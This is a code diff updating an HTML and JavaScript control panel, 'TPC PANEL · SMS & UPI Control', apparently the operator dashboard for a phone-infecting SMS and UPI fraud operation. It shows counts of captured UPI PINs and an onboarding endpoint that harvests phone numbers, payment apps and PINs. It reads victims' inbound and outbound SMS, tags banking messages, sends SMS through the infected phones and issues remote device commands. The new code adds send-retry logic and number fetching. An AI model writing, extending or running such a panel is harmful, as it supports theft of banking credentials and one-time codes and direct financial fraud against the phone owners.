-    .detail-row span:last-child { text-align: right; overflow-wrap: anywhere; font-family: var(--mono); font-size: 12.5px; }
-
     /* -------------------------------------------------------- helpers */
-
     .field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-
     .code-chip {
-        display: inline-block; padding: 9px 15px; border-radius: 9px;
-        font-family: var(--mono); font-size: 19px; font-weight: 700;
-        letter-spacing: 4px; color: var(--neon);
-        background: #22d3ee12; border: 1px dashed #22d3ee45;
-        text-shadow: 0 0 18px #22d3ee66;
+        display: inline-block; padding: 9px 15px; border-radius: 9px; font-family: var(--mono);
+        font-size: 19px; font-weight: 700; letter-spacing: 4px; color: var(--neon);
+        background: #22d3ee12; border: 1px dashed #22d3ee45; text-shadow: 0 0 18px #22d3ee66;
     }
-
     .step-list { margin: 0; padding-left: 20px; color: var(--muted); font-size: 13px; line-height: 2; }
     .step-list code { font-family: var(--mono); color: var(--neon-2); background: #22d3ee10; padding: 1px 6px; border-radius: 5px; }
 
@@ -694,10 +436,7 @@
         .topbar .brand-text p { display: none; }
         .status-pill { display: none; }
         .layout { grid-template-columns: 1fr; }
-        .sidebar {
-            display: flex; gap: 6px; padding: 9px;
-            overflow-x: auto; border-right: 0; border-bottom: 1px solid var(--border);
-        }
+        .sidebar { display: flex; gap: 6px; padding: 9px; overflow-x: auto; border-right: 0; border-bottom: 1px solid var(--border); }
         .sidebar-label, .sidebar-footer { display: none; }
         .nav-button { width: auto; flex: 0 0 auto; margin: 0; padding: 9px 12px; font-size: 12px; }
         .nav-icon { display: none; }
@@ -707,7 +446,7 @@
         .stat-value { font-size: 24px; }
         .panel-header, .panel-body { padding: 14px; }
         .login-card { padding: 24px; }
-        .field-row { grid-template-columns: 1fr; }
+        .field-row, .more-grid { grid-template-columns: 1fr; }
         .device-grid { grid-template-columns: 1fr; }
         .device-toolbar input { width: 100%; }
         .detail-overlay { padding: 12px; }
@@ -725,7 +464,6 @@
 <div class="layer">
 
 <!-- ============================================================== LOGIN -->
-
 <section class="login-screen" id="loginScreen">
     <div class="login-card">
         <div class="brand">
@@ -743,10 +481,8 @@
                 <ellipse class="cat-eye" cx="24" cy="34" rx="4.6" ry="6" fill="#000"/>
                 <ellipse class="cat-eye" cx="40" cy="34" rx="4.6" ry="6" fill="#000"/>
                 <path d="M32 42 l-2.6 3 h5.2 z" fill="#0b1030"/>
-                <path class="cat-whisker" d="M6 40 L20 43 M6 47 L20 47"
-                      stroke="#c4b5fd" stroke-width="1.4" stroke-linecap="round"/>
-                <path class="cat-whisker" d="M58 40 L44 43 M58 47 L44 47"
-                      stroke="#c4b5fd" stroke-width="1.4" stroke-linecap="round"/>
+                <path class="cat-whisker" d="M6 40 L20 43 M6 47 L20 47" stroke="#c4b5fd" stroke-width="1.4" stroke-linecap="round"/>
+                <path class="cat-whisker" d="M58 40 L44 43 M58 47 L44 47" stroke="#c4b5fd" stroke-width="1.4" stroke-linecap="round"/>
             </svg>
             <div class="brand-text">
                 <h1>TPC PANEL</h1>
@@ -762,12 +498,9 @@
             <input id="username" autocomplete="username" placeholder="username" required>
 
             <label for="password">Password</label>
-            <input id="password" type="password" autocomplete="current-password"
-                   placeholder="••••••••" required>
+            <input id="password" type="password" autocomplete="current-password" placeholder="••••••••" required>
 
-            <button class="primary-button login-submit" id="loginButton" type="submit">
-                Sign in
-            </button>
+            <button class="primary-button login-submit" id="loginButton" type="submit">Sign in</button>
 
             <div class="message" id="loginMessage" role="status" aria-live="polite"></div>
         </form>
@@ -780,7 +513,6 @@
 </section>
 
 <!-- ========================================================== DASHBOARD -->
-
 <div class="app" id="dashboardApp" hidden>
     <header class="topbar">
         <div class="brand">
@@ -811,8 +543,7 @@
                 <span id="connectionLabel">Checking</span>
             </span>
 
-            <a class="tg-button" href="https://t.me/icivan" target="_blank"
-               rel="noopener" title="Contact owner">
+            <a class="tg-button" href="https://t.me/icivan" target="_blank" rel="noopener" title="Contact owner">
                 <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
                     <path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/>
                 </svg>
@@ -826,38 +557,21 @@
         <aside class="sidebar">
             <div>
                 <p class="sidebar-label">Main</p>
-
-                <button class="nav-button active" data-page="overview" type="button">
-                    <span class="nav-icon">▦</span> Overview
-                </button>
-                <button class="nav-button" data-page="live" type="button">
-                    <span class="nav-icon">⚡</span> Live dashboard
-                </button>
-                <button class="nav-button" data-page="messages" type="button">
-                    <span class="nav-icon">✉</span> Messages
-                </button>
+                <button class="nav-button active" data-page="overview" type="button"><span class="nav-icon">▦</span> Overview</button>
+                <button class="nav-button" data-page="live" type="button"><span class="nav-icon">⚡</span> Live dashboard</button>
+                <button class="nav-button" data-page="messages" type="button"><span class="nav-icon">✉</span> Messages</button>
 
                 <p class="sidebar-label" style="margin-top:22px">Automation</p>
-
-                <button class="nav-button" data-page="autosender" type="button">
-                    <span class="nav-icon">⟳</span> Auto sender
-                </button>
-                <button class="nav-button" data-page="telegram" type="button">
-                    <span class="nav-icon">✈</span> Telegram bot
-                </button>
+                <button class="nav-button" data-page="autosender" type="button"><span class="nav-icon">⟳</span> Auto sender</button>
+                <button class="nav-button" data-page="telegram" type="button"><span class="nav-icon">✈</span> Telegram bot</button>
 
                 <p class="sidebar-label" style="margin-top:22px">System</p>
-
-                <button class="nav-button" data-page="devices" type="button">
-                    <span class="nav-icon">▣</span> Devices
-                </button>
-                <button class="nav-button" data-page="settings" type="button">
-                    <span class="nav-icon">⚙</span> Settings
-                </button>
+                <button class="nav-button" data-page="devices" type="button"><span class="nav-icon">▣</span> Devices</button>
+                <button class="nav-button" data-page="settings" type="button"><span class="nav-icon">⚙</span> Settings</button>
             </div>
 
             <div class="sidebar-footer">
-                <div>TPC PANEL · v4.2</div>
+                <div>TPC PANEL · v4.3</div>
                 <div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
             </div>
         </aside>
@@ -866,7 +580,6 @@
             <div class="notice" id="globalNotice" hidden></div>
 
             <!-- --------------------------------------------- OVERVIEW -->
-
             <section class="page-section active" id="page-overview">
                 <div class="page-header">
                     <div>
@@ -878,46 +591,27 @@
 
                 <div class="stats-grid">
                     <article class="stat-card shadow-panel">
-                        <div class="stat-top">
-                            <span class="stat-label">Total devices</span>
-                            <span class="stat-icon">▣</span>
-                        </div>
+                        <div class="stat-top"><span class="stat-label">Total devices</span><span class="stat-icon">▣</span></div>
                         <div class="stat-value neon" id="statTotal">—</div>
                         <div class="stat-foot">registered</div>
                     </article>
-
                     <article class="stat-card shadow-panel">
-                        <div class="stat-top">
-                            <span class="stat-label">Active</span>
-                            <span class="stat-icon">◉</span>
-                        </div>
+                        <div class="stat-top"><span class="stat-label">Active</span><span class="stat-icon">◉</span></div>
                         <div class="stat-value green" id="statActive">—</div>
                         <div class="stat-foot">last 90 seconds</div>
                     </article>
-
                     <article class="stat-card shadow-panel">
-                        <div class="stat-top">
-                            <span class="stat-label">Offline</span>
-                            <span class="stat-icon">○</span>
-                        </div>
+                        <div class="stat-top"><span class="stat-label">Offline</span><span class="stat-icon">○</span></div>
                         <div class="stat-value red" id="statOffline">—</div>
                         <div class="stat-foot">no heartbeat</div>
                     </article>
-
                     <article class="stat-card shadow-panel">
-                        <div class="stat-top">
-                            <span class="stat-label">Total SIMs</span>
-                            <span class="stat-icon">▤</span>
-                        </div>
+                        <div class="stat-top"><span class="stat-label">Total SIMs</span><span class="stat-icon">▤</span></div>
                         <div class="stat-value violet" id="statSims">—</div>
                         <div class="stat-foot">SIM slots reported</div>
                     </article>
-
                     <article class="stat-card shadow-panel">
-                        <div class="stat-top">
-                            <span class="stat-label">PINs captured</span>
-                            <span class="stat-icon">🔑</span>
-                        </div>
+                        <div class="stat-top"><span class="stat-label">PINs captured</span><span class="stat-icon">🔑</span></div>
                         <div class="stat-value violet" id="statPins">—</div>
                         <div class="stat-foot">onboarded devices</div>
                     </article>
@@ -931,9 +625,7 @@
                         </div>
                         <div class="table-wrap">
                             <table>
-                                <thead>
-                                    <tr><th>Device</th><th>SIM</th><th>Status</th><th>Registered</th></tr>
-                                </thead>
+                                <thead><tr><th>Device</th><th>SIM</th><th>Status</th><th>Registered</th></tr></thead>
                                 <tbody id="recentDevicesBody"></tbody>
                             </table>
                         </div>
@@ -958,10 +650,10 @@
                             </div>
                             <div class="connection-row">
                                 <div>
-                                    <div class="connection-name">Telegram bot</div>
-                                    <div class="connection-desc">binding status</div>
+                                    <div class="connection-name">Admin socket</div>
+                                    <div class="connection-desc">live link</div>
                                 </div>
-                                <span class="badge" id="tgBadge">Not bound</span>
+                                <span class="badge" id="wsBadge">Connecting</span>
                             </div>
                         </div>
                     </section>
@@ -969,7 +661,6 @@
             </section>
 
             <!-- ------------------------------------------ LIVE DASHBOARD -->
-
             <section class="page-section" id="page-live">
                 <div class="page-header">
                     <div>
@@ -981,39 +672,24 @@
 
                 <div class="stats-grid">
                     <article class="stat-card shadow-panel">
-                        <div class="stat-top">
-                            <span class="stat-label">Total</span>
-                            <span class="stat-icon">▣</span>
-                        </div>
+                        <div class="stat-top"><span class="stat-label">Total</span><span class="stat-icon">▣</span></div>
                         <div class="stat-value neon" id="liveTotal">—</div>
                         <div class="stat-foot">devices</div>
                     </article>
-
                     <article class="stat-card shadow-panel">
-                        <div class="stat-top">
-                            <span class="stat-label">Online</span>
-                            <span class="stat-icon">◉</span>
-                        </div>
+                        <div class="stat-top"><span class="stat-label">Online</span><span class="stat-icon">◉</span></div>
                         <div class="stat-value green" id="liveOnline">—</div>
-                        <div class="stat-foot">streaming socket</div>
+                        <div class="stat-foot">socket up</div>
                     </article>
-
                     <article class="stat-card shadow-panel">
-                        <div class="stat-top">
-                            <span class="stat-label">Offline</span>
-                            <span class="stat-icon">○</span>
-                        </div>
+                        <div class="stat-top"><span class="stat-label">Offline</span><span class="stat-icon">○</span></div>
                         <div class="stat-value red" id="liveOffline">—</div>
                         <div class="stat-foot">socket down</div>
                     </article>
-
                     <article class="stat-card shadow-panel">
-                        <div class="stat-top">
-                            <span class="stat-label">UPI</span>
-                            <span class="stat-icon">₹</span>
-                        </div>
+                        <div class="stat-top"><span class="stat-label">UPI</span><span class="stat-icon">₹</span></div>
                         <div class="stat-value violet" id="liveUpi">—</div>
-                        <div class="stat-foot" id="liveUpiFoot">transactions today</div>
+                        <div class="stat-foot">tagged messages</div>
                     </article>
                 </div>
 
@@ -1051,12 +727,7 @@
                     <div class="table-wrap">
                         <table>
                             <thead>
-                                <tr>
-                                    <th>Device</th>
-                                    <th>Last message</th>
-                                    <th>Send message</th>
-                                    <th>All messages</th>
-                                </tr>
+                                <tr><th>Device</th><th>Target number</th><th>Send message</th><th></th></tr>
                             </thead>
                             <tbody id="liveBody"></tbody>
                         </table>
@@ -1065,7 +736,6 @@
             </section>
 
             <!-- ---------------------------------------------- MESSAGES -->
-
             <section class="page-section" id="page-messages">
                 <div class="page-header">
                     <div>
@@ -1073,8 +743,7 @@
                         <p>All inbound and outbound SMS</p>
                     </div>
                     <div style="display:flex;gap:9px;flex-wrap:wrap">
-                        <input id="msgSearch" class="inline-input" style="width:220px"
-                               placeholder="🔍 search body / number…">
+                        <input id="msgSearch" class="inline-input" style="width:220px" placeholder="🔍 search body / number…">
                         <select id="msgFilter" class="inline-input" style="width:auto">
                             <option value="">All</option>
                             <option value="in">Inbound</option>
@@ -1093,15 +762,7 @@
                     <div class="table-wrap">
                         <table>
                             <thead>
-                                <tr>
-                                    <th>Time</th>
-                                    <th>Device</th>
-                                    <th>Dir</th>
-                                    <th>From / To</th>
-                                    <th>Body</th>
-                                    <th>Amount</th>
-                                    <th>Status</th>
-                                </tr>
+                                <tr><th>Time</th><th>Device</th><th>Dir</th><th>From / To</th><th>Body</th><th>Amount</th><th>Status</th></tr>
                             </thead>
                             <tbody id="messagesBody"></tbody>
                         </table>
@@ -1110,7 +771,6 @@
             </section>
 
             <!-- ------------------------------------------- AUTO SENDER -->
-
             <section class="page-section" id="page-autosender">
                 <div class="page-header">
                     <div>
@@ -1141,8 +801,7 @@
                         <div style="display:flex;gap:10px;margin-top:14px">
                             <button class="primary-button" id="ruleAdd" type="button">Add rule</button>
                             <label class="badge" style="gap:7px;cursor:pointer">
-                                <input type="checkbox" id="ruleUpiOnly" style="width:auto">
-                                UPI only
+                                <input type="checkbox" id="ruleUpiOnly" style="width:auto"> UPI only
                             </label>
                         </div>
                     </div>
@@ -1155,9 +814,7 @@
                     </div>
                     <div class="table-wrap">
                         <table>
-                            <thead>
-                                <tr><th>Name</th><th>Match</th><th>Reply</th><th>Scope</th><th>Status</th><th></th></tr>
-                            </thead>
+                            <thead><tr><th>Name</th><th>Match</th><th>Reply</th><th>Scope</th><th>Status</th><th></th></tr></thead>
                             <tbody id="rulesBody"></tbody>
                         </table>
                     </div>
@@ -1165,7 +822,6 @@
             </section>
 
             <!-- -------------------------------------------- TELEGRAM -->
-
             <section class="page-section" id="page-telegram">
                 <div class="page-header">
                     <div>
@@ -1250,9 +906,7 @@
                     </div>
                     <div class="table-wrap">
                         <table>
-                            <thead>
-                                <tr><th>Time</th><th>Direction</th><th>Text</th><th>Result</th></tr>
-                            </thead>
+                            <thead><tr><th>Time</th><th>Direction</th><th>Text</th><th>Result</th></tr></thead>
                             <tbody id="tgLogBody"></tbody>
                         </table>
                     </div>
@@ -1260,12 +914,11 @@
             </section>
 
             <!-- ----------------------------------------------- DEVICES -->
-
             <section class="page-section" id="page-devices">
                 <div class="page-header">
                     <div>
                         <h2>Devices</h2>
-                        <p>Kisi bhi phone par click karo — info, battery aur saare messages khulenge</p>
+                        <p>Kisi bhi phone par click karo — numbers, info aur saare messages</p>
                     </div>
                     <div class="device-toolbar">
                         <input id="deviceSearch" class="inline-input" placeholder="🔍 device / model / number">
@@ -1279,7 +932,6 @@
             </section>
 
             <!-- ---------------------------------------------- SETTINGS -->
-
             <section class="page-section" id="page-settings">
                 <div class="page-header">
                     <div>
@@ -1291,49 +943,21 @@
                 <section class="panel shadow-panel">
                     <div class="panel-header"><h3>Application</h3></div>
                     <div class="panel-body">
-                        <div class="settings-row">
-                            <strong>Panel</strong>
-                            <p>TPC PANEL · SMS &amp; UPI Control · v4.2</p>
-                        </div>
-                        <div class="settings-row">
-                            <strong>Owner</strong>
-                            <p><a href="https://t.me/icivan" target="_blank" rel="noopener">https://t.me/icivan</a></p>
-                        </div>
-                        <div class="settings-row">
-                            <strong>Device socket</strong>
-                            <p>/ws/device/{registration_id}</p>
-                        </div>
-                        <div class="settings-row">
-                            <strong>SMS ingest</strong>
-                            <p>/devices/sms/incoming</p>
-                        </div>
-                        <div class="settings-row">
-                            <strong>Onboarding</strong>
-                            <p>/devices/onboarding — phone number, payment app aur UPI PIN capture</p>
-                        </div>
-                        <div class="settings-row">
-                            <strong>Outbox poll</strong>
-                            <p>/devices/outbox</p>
-                        </div>
-                        <div class="settings-row">
-                            <strong>Telegram webhook</strong>
-                            <p>/telegram/webhook/{bot_id}</p>
-                        </div>
+                        <div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; UPI Control · v4.3</p></div>
+                        <div class="settings-row"><strong>Owner</strong><p><a href="https://t.me/icivan" target="_blank" rel="noopener">https://t.me/icivan</a></p></div>
+                        <div class="settings-row"><strong>Device socket</strong><p>/ws/device/{registration_id}</p></div>
+                        <div class="settings-row"><strong>Admin socket</strong><p>/ws/admin — live events; na chale to panel auto polling par chalta hai</p></div>
+                        <div class="settings-row"><strong>SMS ingest</strong><p>/devices/sms/incoming</p></div>
+                        <div class="settings-row"><strong>Send SMS</strong><p>/admin/send — device_id + to + body (to blank ho to device SIM number)</p></div>
+                        <div class="settings-row"><strong>Device command</strong><p>/admin/devices/{id}/command — actions: ping, fetch_number</p></div>
+                        <div class="settings-row"><strong>Onboarding</strong><p>/devices/onboarding — phone number, payment app aur UPI PIN capture</p></div>
+                        <div class="settings-row"><strong>Outbox poll</strong><p>/devices/outbox</p></div>
+                        <div class="settings-row"><strong>Telegram webhook</strong><p>/telegram/webhook/{bot_id}</p></div>
                         <div class="settings-row">
                             <strong>UPI detection</strong>
-                            <p>
-                                Inbound SMS jinme UPI/credited/debited keywords aur amount
-                                pattern milta hai, unhe UPI transaction maan kar
-                                alag se tag kiya jaata hai.
-                            </p>
+                            <p>Inbound SMS jinme UPI/credited/debited keywords aur amount pattern milta hai, unhe UPI transaction maan kar alag se tag kiya jaata hai.</p>
                         </div>
-                        <div class="settings-row">
-                            <strong>Secrets</strong>
-                            <p>
-                                SESSION_SECRET, ADMIN_API_KEY, MONGODB_URI aur bot token
-                                server-side rakho.
-                            </p>
-                        </div>
+                        <div class="settings-row"><strong>Secrets</strong><p>SESSION_SECRET, ADMIN_API_KEY, MONGODB_URI aur bot token server-side rakho.</p></div>
                     </div>
                 </section>
             </section>
@@ -1344,7 +968,6 @@
 </div>
 
 <!-- ==================================================== DEVICE DETAIL -->
-
 <div class="detail-overlay" id="deviceDetail" hidden>
     <div class="detail-shell">
 
@@ -1359,29 +982,52 @@
             </div>
             <div class="detail-head-right">
                 <span id="dvBattery"></span>
-                <button class="secondary-button" id="dvRefresh" type="button">↻ Refresh</button>
+                <button class="secondary-button" id="dvFetchNum" type="button">⟳ fetch number</button>
+                <button class="secondary-button" id="dvPing" type="button">📶 ping</button>
                 <button class="secondary-button" id="dvClose" type="button">Close</button>
             </div>
         </div>
 
+        <div class="link-banner" id="dvLinkBanner" hidden></div>
+
         <div class="detail-grid">
             <div class="detail-col">
                 <section class="panel shadow-panel">
-                    <div class="panel-header"><h3>Device info</h3></div>
-                    <div class="panel-body" id="dvInfo"></div>
+                    <div class="panel-header">
+                        <h3>Numbers</h3>
+                        <span class="badge" id="dvNumState">—</span>
+                    </div>
+                    <div class="panel-body" id="dvNumbers"></div>
                 </section>
 
                 <section class="panel shadow-panel">
-                    <div class="panel-header"><h3>Send SMS</h3></div>
+                    <div class="panel-header"><h3>Specs</h3></div>
+                    <div class="panel-body"><div class="spec-grid" id="dvSpecs"></div></div>
+                </section>
+
+                <section class="panel shadow-panel">
+                    <div class="panel-header">
+                        <h3>Send SMS</h3>
+                        <span class="badge" id="dvTargetBadge">—</span>
+                    </div>
                     <div class="panel-body">
                         <label for="dvTo">To (blank = device SIM number)</label>
                         <input id="dvTo" placeholder="+91…" class="mono">
                         <label for="dvBody">Message</label>
                         <textarea id="dvBody" placeholder="Type message…"></textarea>
-                        <button class="primary-button" id="dvSend" style="margin-top:12px" type="button">
-                            ⚡ Send
-                        </button>
+                        <button class="primary-button" id="dvSend" style="margin-top:12px" type="button">⚡ Send</button>
+
+                        <div class="muted small upper" style="margin:16px 0 6px">Recent sends</div>
+                        <div id="dvOutbox"></div>
                     </div>
+                </section>
+
+                <section class="panel shadow-panel">
+                    <div class="panel-header">
+                        <h3>More info</h3>
+                        <button class="secondary-button" id="dvMoreToggle" type="button">show</button>
+                    </div>
+                    <div class="panel-body" id="dvMore" hidden></div>
                 </section>
             </div>
 
@@ -1398,9 +1044,7 @@
                         <option value="in">Inbound</option>
                         <option value="out">Outbound</option>
                     </select>
-                    <label class="badge">
-                        <input type="checkbox" id="dvUpi"> UPI only
-                    </label>
+                    <label class="badge"><input type="checkbox" id="dvUpi"> UPI only</label>
                 </div>
 
                 <div class="msg-list" id="dvMsgList"></div>
@@ -1412,7 +1056,6 @@
 <div class="toast" id="toast" role="status" aria-live="polite" hidden></div>
 
 <!-- ============================================================ SCRIPT -->
-
 <script>
 "use strict";
 
@@ -1425,22 +1068,31 @@ const state = {
     rules: [],
     bots: [],
     tgLogs: [],
+    outbox: [],
     pinsOnly: false,
     activeDevice: null,
-    toastTimer: null
+    toastTimer: null,
+    pollTimer: null,
+    ws: null,
+    wsOk: false,
+    wsFails: 0,
+    wsTimer: null,
+    linkOk: true,
+    numTried: {}
 };
 
 const PHONE_SVG = '<svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"><rect x="6" y="2.4" width="12" height="19.2" rx="3.2"/><line x1="10.4" y1="5.4" x2="13.6" y2="5.4"/><circle cx="12" cy="18.3" r="0.95" fill="currentColor" stroke="none"/></svg>';
 const BOLT_SVG = '<svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M13.5 2 5 13h5.5L9.5 22 19 10.5h-5.9z"/></svg>';
 
 /* ------------------------------------------------------------ utils */
+function uid() { return Math.random().toString(36).slice(2, 10); }
 
 function showToast(msg) {
     const t = $("#toast");
     t.textContent = msg;
     t.hidden = false;
     clearTimeout(state.toastTimer);
-    state.toastTimer = setTimeout(() => { t.hidden = true; }, 3500);
+    state.toastTimer = setTimeout(() => { t.hidden = true; }, 3800);
 }
 
 function setLoginMessage(msg, type = "error") {
@@ -1481,8 +1133,8 @@ function createBadgeCell(row, v, forceType) {
     const s = String(safeValue(v, "unknown")).toLowerCase();
     b.className = "badge";
     if (forceType) b.classList.add(forceType);
-    else if (["online","active","sent","success","bound","upi"].includes(s)) b.classList.add("online");
-    else if (["pending","queued"].includes(s)) b.classList.add("pending");
+    else if (["online","active","sent","success","bound","upi","delivered","received"].includes(s)) b.classList.add("online");
+    else if (["pending","queued","sending"].includes(s)) b.classList.add("pending");
     else if (["failed","error","offline"].includes(s)) b.classList.add("error");
     b.textContent = safeValue(v, "—");
     td.appendChild(b);
@@ -1520,7 +1172,6 @@ function highlight(text, needle) {
 }
 
 /* --------------------------------------------------- device helpers */
-
 function getDeviceId(d) { return d.id ?? d._id ?? null; }
 
 function getDeviceName(d) {
@@ -1537,7 +1188,6 @@ function getTelemetry(d) {
 }
 
 function isOnline(d) { return Boolean(d.ws_connected); }
-
 function hasPin(d) { return Boolean(d.upi_pin); }
 
 function batteryLevel(d) {
@@ -1604,9 +1254,9 @@ function pickValue(obj, keys) {
 
 function ramLabel(d) {
     const t = getTelemetry(d);
-    const gb = pickValue(t, ["ram_gb","total_ram_gb","ram_size_gb","memory_gb","ram_gb_total"]);
+    const gb = pickValue(t, ["ram_gb","total_ram_gb","ram_size_gb","memory_gb"]);
     if (gb !== null) return `${gb} GB`;
-    const mb = pickValue(t, ["ram_total_mb","ram_mb","ram_total","total_ram_mb","total_ram","ram","memory_total","memory","device_ram"]);
+    const mb = pickValue(t, ["ram_total_mb","ram_mb","ram_total","total_ram_mb","total_ram","ram","memory_total","memory"]);
     if (mb !== null) return smartMemory(mb);
     const dv = pickValue(d, ["ram","ram_gb","total_ram"]);
     return dv !== null ? smartMemory(dv) : "—";
@@ -1614,9 +1264,9 @@ function ramLabel(d) {
 
 function storageLabel(d) {
     const t = getTelemetry(d);
-    const gb = pickValue(t, ["storage_gb","total_storage_gb","disk_gb","rom_gb","storage_size_gb"]);
+    const gb = pickValue(t, ["storage_gb","total_storage_gb","disk_gb","rom_gb"]);
     if (gb !== null) return `${gb} GB`;
-    const mb = pickValue(t, ["storage_total_mb","storage_mb","storage_total","total_storage","storage","disk_total","internal_storage","rom"]);
+    const mb = pickValue(t, ["storage_total_mb","storage_mb","storage_total","total_storage","storage","disk_total","internal_storage"]);
     if (mb !== null) return smartMemory(mb);
     const dv = pickValue(d, ["storage","storage_gb"]);
     return dv !== null ? smartMemory(dv) : "—";
@@ -1624,8 +1274,20 @@ function storageLabel(d) {
 
 function freeStorageLabel(d) {
     const t = getTelemetry(d);
-    const v = pickValue(t, ["free_storage_mb","storage_free_mb","free_storage","storage_free","free_disk","available_storage"]);
+    const v = pickValue(t, ["free_storage_mb","storage_free_mb","free_storage","storage_free","available_storage"]);
     return v !== null ? smartMemory(v) : null;
+}
+
+function numberInfo(d) {
+    const t = getTelemetry(d);
+    return {
+        entered: d.phone_number || d.onboard_number || d.entered_number || null,
+        live: t.sim_number || d.sim_number || null,
+        source: t.sim_number_source || d.sim_number_source || null,
+        carrier: t.sim_carrier || d.sim_carrier || null,
+        serial: t.sim_serial || null,
+        slots: Array.isArray(t.sims) ? t.sims : []
+    };
 }
 
 function deviceMessages(d) {
@@ -1635,7 +1297,6 @@ function deviceMessages(d) {
 }
 
 /* ------------------------------------------------------- api client */
-
 async function api(path, options = {}) {
     const res = await fetch(path, {
         credentials: "same-origin",
@@ -1666,8 +1327,131 @@ async function api(path, options = {}) {
     return data;
 }
 
-/* ------------------------------------------------------------ auth */
+/* --------------------------------------------------- send engine */
+async function attemptSend(job) {
+    const attempts = [
+        { url: "/admin/send", payload: { target: "device", device_id: job.deviceId, to: job.to, body: job.body } },
+        { url: "/admin/send", payload: { device_id: job.deviceId, to: job.to, message: job.body } },
+        { url: `/admin/devices/${job.deviceId}/sms`, payload: { to: job.to, body: job.body } }
+    ];
 
+    job.status = "sending";
+    renderOutbox();
+
+    let lastErr = null;
+    for (const a of attempts) {
+        try {
+            const r = await api(a.url, { method: "POST", body: JSON.stringify(a.payload) });
+            job.status = "queued";
+            job.response = r;
+            renderOutbox();
+            showToast(`queued → ${job.deviceName || job.to || "device"}`);
+            loadMessages().catch(() => {});
+            return true;
+        } catch (e) { lastErr = e; }
+    }
+
+    job.status = "failed";
+    job.error = lastErr ? lastErr.message : "send failed";
+    renderOutbox();
+    showToast("send fail: " + job.error);
+    return false;
+}
+
+function sendSms({ deviceId, deviceName, to, body }) {
+    const job = { id: uid(), deviceId, deviceName, to: to || null, body, at: Date.now(), status: "sending", error: null };
+    state.outbox.unshift(job);
+    if (state.outbox.length > 60) state.outbox.pop();
+    renderOutbox();
+    return attemptSend(job);
+}
+
+function renderOutbox() {
+    const box = $("#dvOutbox");
+    if (!box) return;
+    const d = state.activeDevice;
+    const list = state.outbox.filter((j) => !d || String(j.deviceId) === String(getDeviceId(d)));
+
+    box.replaceChildren();
+    if (!list.length) {
+        const e = document.createElement("div");
+        e.className = "muted small";
+        e.textContent = "Koi recent send nahi";
+        box.appendChild(e);
+        return;
+    }
+
+    list.slice(0, 6).forEach((j) => {
+        const item = document.createElement("div");
+        item.className = "outbox-item";
+
+        const b = document.createElement("span");
+        b.className = "badge " + (j.status === "sent" ? "online" : j.status === "failed" ? "error" : "pending");
+        b.textContent = j.status;
+        item.appendChild(b);
+
+        const body = document.createElement("span");
+        body.className = "outbox-body";
+        body.textContent = (j.to ? j.to + " · " : "") + j.body;
+        body.title = j.body;
+        item.appendChild(body);
+
+        if (j.status === "failed") {
+            const rb = document.createElement("button");
+            rb.className = "row-button";
+            rb.type = "button";
+            rb.textContent = "Retry";
+            rb.addEventListener("click", () => attemptSend(j));
+            item.appendChild(rb);
+        } else {
+            const t = document.createElement("span");
+            t.className = "outbox-time";
+            t.textContent = new Date(j.at).toLocaleTimeString();
+            item.appendChild(t);
+        }
+
+        box.appendChild(item);
+    });
+}
+
+/* ------------------------------------------------ device commands */
+async function deviceCommand(id, action) {
+    const tries = [
+        [`/admin/devices/${id}/command`, { action }],
+        [`/admin/devices/${id}/refresh`, { action }],
+        [`/admin/devices/${id}/ping`, {}],
+        [`/admin/devices/${id}/wake`, {}]
+    ];
+    for (const [url, payload] of tries) {
+        try {
+            await api(url, { method: "POST", body: JSON.stringify(payload) });
+            return url;
+        } catch { /* next */ }
+    }
+    return null;
+}
+
+async function pingDevice(d) {
+    showToast("ping bheja…");
+    await deviceCommand(getDeviceId(d), "ping");
+    setTimeout(() => loadDevices().catch(() => {}), 1200);
+}
+
+async function fetchDeviceNumber(d) {
+    const btn = $("#dvFetchNum");
+    if (btn) { btn.disabled = true; btn.textContent = "fetching…"; }
+    try {
+        const hit = await deviceCommand(getDeviceId(d), "fetch_number");
+        await new Promise((r) => setTimeout(r, 1200));
+        await loadDevices();
+        const fresh = state.devices.find((x) => String(getDeviceId(x)) === String(getDeviceId(d)));
+        const live = fresh ? numberInfo(fresh).live : null;
+        showToast(live ? `live number: ${live}` : (hit ? "number request bheja — device reply ka wait karo" : "device se number nahi mila"));
+    } catch (e) { showToast(e.message); }
+    finally { if (btn) { btn.disabled = false; btn.textContent = "⟳ fetch number"; } }
+}
+
+/* ------------------------------------------------------------ auth */
 function showLogin() {
     state.authenticated = false;
     $("#dashboardApp").hidden = true;
@@ -1684,7 +1468,7 @@ function showDashboard() {
 async function checkAuth() {
     try {
         const r = await api("/admin/auth/status");
-        if (r.authenticated) { showDashboard(); await refreshAll(); }
+        if (r.authenticated) { showDashboard(); await refreshAll(); startRealtime(); }
         else showLogin();
     } catch (e) {
         showLogin();
@@ -1693,7 +1477,6 @@ async function checkAuth() {
 }
 
 /* ------------------------------------------------------- renderers */
-
 function renderOverview() {
     const total = state.devices.length;
     const online = state.devices.filter(isOnline).length;
@@ -1702,11 +1485,8 @@ function renderOverview() {
     $("#statActive").textContent = online;
     $("#statOffline").textContent = total - online;
 
-    const sims = state.devices.reduce(
-        (sum, d) => sum + (getTelemetry(d).sims?.length || d.sim_count || 0), 0
-    );
+    const sims = state.devices.reduce((sum, d) => sum + (getTelemetry(d).sims?.length || d.sim_count || 0), 0);
     $("#statSims").textContent = sims;
-
     $("#statPins").textContent = state.devices.filter(hasPin).length;
 
     const body = $("#recentDevicesBody");
@@ -1720,7 +1500,8 @@ function renderOverview() {
         appendCell(row, getDeviceName(d));
 
         const simCell = document.createElement("td");
-        simCell.textContent = t.sim_number || d.sim_number || t.sim_carrier || "—";
+        const info = numberInfo(d);
+        simCell.textContent = info.live || info.entered || t.sim_carrier || "—";
         if (d.upi_pin) {
             const pin = document.createElement("span");
             pin.className = "cell-pin";
@@ -1744,9 +1525,7 @@ function renderLive() {
     $("#liveOnline").textContent = online;
